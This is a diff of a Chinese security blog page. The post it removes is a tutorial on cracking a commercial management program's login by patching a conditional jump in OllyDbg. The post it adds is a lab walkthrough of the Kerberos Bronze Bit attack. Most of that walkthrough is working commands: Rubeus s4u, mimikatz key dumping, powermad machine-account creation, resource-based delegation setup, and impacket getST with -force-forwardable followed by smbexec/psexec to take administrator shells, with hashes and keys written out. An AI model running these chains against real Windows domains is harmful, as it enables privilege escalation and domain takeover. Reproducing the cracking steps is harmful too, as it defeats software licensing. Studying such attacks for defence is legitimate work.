@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>破解劳保用户管理系统 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="破解劳保用户管理系统 | 九世的博客">
+  <title>Kerberos Bronze Bit Attack 绕过约束委/资源派限制 | 九世的博客</title>
+  <meta name="keywords" content=" 域渗透 ">
+  <meta name="description" content="Kerberos Bronze Bit Attack 绕过约束委/资源派限制 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="友链BGM:拔剑神曲   即刻安全 Hacking 木头的博客 hackhat社区 Xhong的博客">
 <meta property="og:type" content="website">
@@ -1680,9 +1680,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-破解劳保用户管理系统" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Kerberos-Bronze-Bit-Attack-绕过约束委-资源派限制" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">破解劳保用户管理系统</h1>
+        <h1 class="article-title">Kerberos Bronze Bit Attack 绕过约束委/资源派限制</h1>
     
     <div class="article-meta">
         
@@ -1691,14 +1691,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color4">域渗透</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2018-08-24 15:54</time>
+        创建时间:<time class="date" title="更新时间: 2021-03-19 14:44:57">2021-03-19 14:28</time>
         
     </div>
     <div class="article-meta">
@@ -1720,7 +1720,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#概述"><span class="toc-text">概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域环境"><span class="toc-text">域环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#传统的约束委派绕过"><span class="toc-text">传统的约束委派绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#基于资源的约束委派绕过"><span class="toc-text">基于资源的约束委派绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考链接"><span class="toc-text">参考链接</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1735,34 +1735,54 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>昨天在即刻群里面窥屏，发现一个shark恒的破解教程。我用“念”去查看，嗯发现这是个不错的东西（完全扯淡），昨天晚上就看了。心里痒想破解（手动滑稽），今天下午找到了劳保管理系统2012的软件，破解成功了。故此来做个记录<br><img src="https://i.imgur.com/IHsMSOc.jpg" alt=""></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>首先劳保软件管理系统下载：<a href="http://www.duote.com/soft/121.html" target="_blank" rel="noopener">http://www.duote.com/soft/121.html</a><br>准备好工具，OD，EXEInfoPE或者PEID<br>按照昨天学习的操作：</p>
-<pre><code>先查壳，将下载好的exe拖入EXEInfoPE查壳（我这里用的是EXEInfoPE）
-</code></pre><p><img src="https://i.imgur.com/1OVe1zG.png" alt=""><br>没有壳，进行软件测试。</p>
-<pre><code>打开界面，瞎输，发现有4次机会，如果全部错误则会弹出登陆框
-</code></pre><p><img src="https://i.imgur.com/FzvkjGy.png" alt=""></p>
-<p><img src="https://i.imgur.com/wEbItRg.png" alt=""><br>继续回到昨天的操作，将exe拖入到OD里面<br><img src="https://i.imgur.com/oPwcGHf.png" alt=""><br>进行字符搜索，搜索关键字：密码错误<br><img src="https://i.imgur.com/vKi8lYJ.png" alt=""><br>双击跳到，CPU区。<br><img src="https://i.imgur.com/C6mF7FE.png" alt=""></p>
-<pre><code>从图中可以看出 &gt; //跳转符
-还有红色的线代表跳转，灰色的线代表跳转不成功
-</code></pre><p>现在移到红线的上方<br><img src="https://i.imgur.com/EFZFAsD.png" alt=""><br>jnz代表条件跳转<br><img src="https://i.imgur.com/9h0x7X8.png" alt=""><br>然后我们下个断点，进行软件运行测试。<br><img src="https://i.imgur.com/wgg4U5B.png" alt=""><br>运行软件，发现断点的地方变成白底红字（说明软件运行在这了）<br><img src="https://i.imgur.com/VX9WTO7.png" alt=""><br>F8单步调试，看看<br><img src="https://i.imgur.com/bourawt.png" alt=""><br>跳转到了密码错误，在回到昨天晚上学习的操作，在断点处进行Noop填充<br><img src="https://i.imgur.com/HFK6Exo.png" alt=""><br>noop填充就是，等于把这个跳转删除了。然后在单步看看<br><img src="https://i.imgur.com/enL8Ce4.png" alt=""><br>跳过了密码错误，我们在运行软件看看</p>
-<p>乱输一通，发现登陆成功了！！！<br><img src="https://i.imgur.com/sfeDmnM.png" alt=""><br><img src="https://i.imgur.com/9ZJUHyh.png" alt=""><br>然后破解的软件即可。</p>
-<p><strong>总结：</strong></p>
-<pre><code>逆向第一课总结:
-
-1.首先判断软件有没有加壳，用peid看，如果加了壳就找对应的脱壳工具，进行脱壳。
-
-2.然后运行软件，观察软件的运行。获取关键字。如:密码错误的那个
-
-3.把软件拖入od进行搜索关键字，双击关键字的那行。然后跳到CPU区，进行断点。f6运行程序看程序是不是跳到哪里。如果跳转成立的线是红色的，不成立则为灰色，跳转标识符&gt;
-，然后进行noop填聪(就是什么也没有)，然后软件就破解了。
-
-
-自己可以考虑用C写个简单的登陆程序，进行破解。完毕
-
-注意:搜索用智能搜索，搜索关键字要模糊化，不要全部打上。搜索跳转到CPU区之后先看软件的运行流程，分析软件，下断点，按f6运行程序进行调试。然后进行下一步。
-
-破解完后如果要进行保存，点击复制到可执行文件，选择，保存文件。给他取个名字
-</code></pre><p>欢迎加入即刻安全技术交流群：307283889<br>转载请声明转自422926799.github.io</p>
+        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>该漏洞解决了两个问题<br>1.禁止协议转换/协议过渡<br>2.受保护的用户和敏感用户不能被委派<br>具体设置表现为DC上设置Service1计算机账户为“仅使用Kerberos”而非“使用任何身份验证协议”  </p>
+<h2 id="域环境"><a href="#域环境" class="headerlink" title="域环境"></a>域环境</h2><p>DC：WIN-5CHMN9C4UES.YAYI.local (Windows Server 2012)<br>域内两台机器：<br>one2008.YAYI.local (Windows Server 2008)<br>WIN-BMIO66D4K15.YAYI.local (Windows 7)</p>
+<p>域用户:<br>fwwr<br>joke</p>
+<h2 id="传统的约束委派绕过"><a href="#传统的约束委派绕过" class="headerlink" title="传统的约束委派绕过"></a>传统的约束委派绕过</h2><p>服务用户：<br><img src="https://s4.ax1x.com/2021/03/19/6W8P3R.png" alt=""></p>
+<p>委派对象：目标机器WIN-5CHMN9C4UES.YAYI.local<br><img src="https://s4.ax1x.com/2021/03/19/6W8VHO.png" alt=""></p>
+<p><img src="https://s4.ax1x.com/2021/03/19/6W8n4H.png" alt=""></p>
+<p>常规的约束委派利用:</p>
+<pre><code>1. 得到约束委派机器的用户凭证
+2. 发现委派用户委派的目标机器
+3. 获取RC4利用
+</code></pre><p>powerview查看约束委派的机器:</p>
+<pre><code>Get-DomainComputer -TrustedToAuth -Properties distinguishedname,msds-allowedtodelegateto | fl
+</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6W8f2R.png" alt=""></p>
+<p>Rubeus一条命令实现约束委派：</p>
+<pre><code>Rubeus.exe s4u /user:fwwr /domain:YAYI.local /rc4:ca69e7f0f02d9156d1616ba6abd395b6 /impersonateuser:administrator /msdsspn:&quot;dhcp/WIN-5CHMN9C4UES.YAYI.local/YAYI.local&quot; /altservice:cifs /ptt
+</code></pre><p>由于用户设置了”敏感用户，不能被委派”，将造成失败<br><img src="https://s4.ax1x.com/2021/03/19/6W8jxI.png" alt=""></p>
+<p>使用新版impacket绕过：（截至最新版本：0.9.22），最低版本要求：（0.9.21）<br>先登录one2008机器用mimikatz获取AES和RC4</p>
+<pre><code>privilege::debug
+sekurlsa::&quot;ekeys&quot;
+</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGCdS.png" alt=""></p>
+<p>获取TGT导入smbexec连接</p>
+<pre><code>python3 getST.py -spn cifs/WIN-5CHMN9C4UES.YAYI.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:0adce35e9d541588782a98fe1fce59cf -aesKey 56f41eb095b4099b27934963200180321742c6f89db55bff02495b22b17afe69 YAYI.local/one2008 -force-forwardable
+export KRB5CCNAME=administrator.ccache
+sudo python3 smbexec.py -no-pass -k WIN-5CHMN9C4UES.YAYI.local
+</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGkGj.png" alt=""></p>
+<p><img src="https://s4.ax1x.com/2021/03/19/6WGZMq.png" alt=""></p>
+<h2 id="基于资源的约束委派绕过"><a href="#基于资源的约束委派绕过" class="headerlink" title="基于资源的约束委派绕过"></a>基于资源的约束委派绕过</h2><p>先配置环境，首先删除上一步service1的委派权限<br><img src="https://s4.ax1x.com/2021/03/19/6WGKdU.png" alt=""></p>
+<p>用adsi编辑器赋予域用户joke对 one2008写入权限<br><img src="https://s4.ax1x.com/2021/03/19/6WG3W9.png" alt=""></p>
+<p>joke用户可登录WIN-BMIO66D4K15，登录进去后<br>过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword</p>
+<pre><code>Import-Module .\powermad.ps1
+New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)
+</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WGsSA.png" alt=""></p>
+<p>用mimikatz计算出hash<br><img src="https://s4.ax1x.com/2021/03/19/6WJ961.png" alt=""></p>
+<p>使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到one2008的传入信任关系。</p>
+<pre><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll
+Get-ADComputer AttackerService #确认机器账户已经被添加
+Set-ADComputer one2008 -PrincipalsAllowedToDelegateToAccount AttackerService$ #设置域用户到目标机器
+Get-ADComputer one2008 -Properties PrincipalsAllowedToDelegateToAccount #查看机器
+</code></pre><p>验证用户是否成功委派到目标机器</p>
+<pre><code>Get-DomainUser -Identity &lt;user&gt; -Properties objectsid #获取某个用户的SID
+Get-DomainObjectAcl -Identity one2008.YAYI.local  | ?{$_.SecurityIdentifier -match &quot;S-1-5-21-2799505025-1944254007-2887416074-1618&quot;} #查询某个机子的ACL
+</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJmpd.png" alt=""></p>
+<p>可以看到现在对One2008.YAYI.local有完全的控制权限，直接申请TGT远程连接即可 (这里的RC4和AES key是上面的mimikatz获取的)</p>
+<pre><code>python3 getST.py -spn cifs/one2008.YAYI.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 537056f14b0f81bc6e4be6ddba7786efdadb813c61ed5a6dce1b YAYI.local/AttackerService -force-forwardable
+export KRB5CCNAME=administrator.ccache
+python3 psexec.py -no-pass -k one2008.YAYI.local
+</code></pre><p><img src="https://s4.ax1x.com/2021/03/19/6WJaXq.png" alt=""></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://y4er.com/post/kerberos-bronze-bit-attack/" target="_blank" rel="noopener">https://y4er.com/post/kerberos-bronze-bit-attack/</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1772,12 +1792,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>破解劳保用户管理系统</p>
+    <p><span class="copy-title">文章标题:</span>Kerberos Bronze Bit Attack 绕过约束委/资源派限制</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2018-08-24, 15:54:15</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/10ddccc5.html" title="破解劳保用户管理系统">http://422926799.github.io/posts/10ddccc5.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-03-19, 14:28:37</p>
+    <p><span class="copy-title">最后更新:</span>2021-03-19, 14:44:57</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9cf32cdf.html" title="Kerberos Bronze Bit Attack 绕过约束委/资源派限制">http://422926799.github.io/posts/9cf32cdf.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
